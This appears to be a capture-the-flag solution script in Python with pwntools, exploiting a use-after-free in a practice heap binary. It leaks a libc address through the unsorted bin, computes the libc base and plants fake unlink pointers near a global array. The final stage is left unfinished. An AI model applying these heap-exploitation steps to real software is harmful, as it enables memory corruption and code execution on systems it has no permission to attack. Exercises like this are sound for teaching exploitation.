'''
Unsorted Bin Attack Challenge solution
'''

from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '../../libc_versions/2.23/libc-2.23.so' # For alternate version of libc
env = {}

# Binary setup
elf_name = 'magic_value'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process([elf.path],env=env)
	gdb.attach(p, gdbscript='''
dir ../../libc_versions/2.23/
''')
else: 
	p = process(elf.path, env=env) 

'''
Creates a string 

Parameter: 
	- string: the text to be put into the string.
'''
def create_string(string):
	p.sendlineafter(">", "1") 
	p.sendlineafter(">", str(string))

'''
View A string

Parameter:
	- index: The index of the string to print
Returns: 
	- The output from the print
'''
def view_string(index): 
	p.sendlineafter(">", "4")
	p.sendlineafter(">", str(index))
	p.recvuntil("Your string:") # Right before string output

	# Outputted data
	output = p.recvuntil("Welcome").replace("Welcome","") 
	return output

'''
Delete a string 

Parameter: 
	- index: The index of the string to remove
'''	
def delete_string(index): 
	p.sendlineafter(">", "3")
	p.sendlineafter(">", str(index))
	return 

''' 
Edit a string
Parameters: 
	- index: The index of the string to edit
	- string: The text to be put into the string
'''
def edit_string(index, string):
	p.sendlineafter(">", "2") 
	p.sendlineafter(">", str(index))
	p.sendlineafter(">", str(string)) 
	return 

def trigger_bug():
	###########################
	# SETUP ###################
	###########################
	''' 
	Instead of settting the ptr to zero in the lst, it just 
	decrements the counter for the size. 

	So, if we free a 'string' that is not at the top of the list
	there is a 'use after free' that is created. 

	We allocate three 'strings' and free index 0. Now, there is a
	UAF on the 0th index. 
	'''
	create_string("ONE")   # Index 0 
	create_string("TWO")   # Index 1 
	create_string("THREE") # Index 2

	##########################
	#### Trigger #############
	##########################
	# Free index 0 -- This creates a use after free on the malloc chunk at index 0. 
	'''
	This chunks goes into the unsorted bin because of the size. 
	The chunk directly above (index 0) is important because if 
	this chunk was not there, then the chunk would be next to the 
	top chunk as free. 

	Creates a UAF on chunk 1
	''' 
	delete_string(0) # String 1 NOW has a pointer to LibC
	return 1

def libc_leak(): 
	'''
	From the previous step, there is a UAF on an unsorted_bin chunk
	at index 0. 
	This allows us to get a LEAK to LibC (only item in the bin. So,
	both pointers point to LibC). 

	Use the offset to get the base of libc! 
	'''
	offset = 0x39fb78
	leak = view_string(0)[1:8] + "\x00"
	leak = u64(leak) # Unpack the string to convert it to an integer
	print("LibC Leak: ", hex(leak))
	
	libc_base = leak - offset
	print("LibC Base: ", hex(libc_base))
	return libc_base

def fake_pointers(): 
	'''
	'''
	strings_ptr = elf.symbols['strings'] # Location of the pointers
	edit_string(0, p64(strings_ptr - 0x18) + p64(strings_ptr - 0x10))
	pause() 
	delete_string(1)


# Trigger the vulnerability. 
# Creates a UAF on index.
UAF_index = trigger_bug() 
libc_base = libc_leak() 
fake_pointers() 

p.interactive()


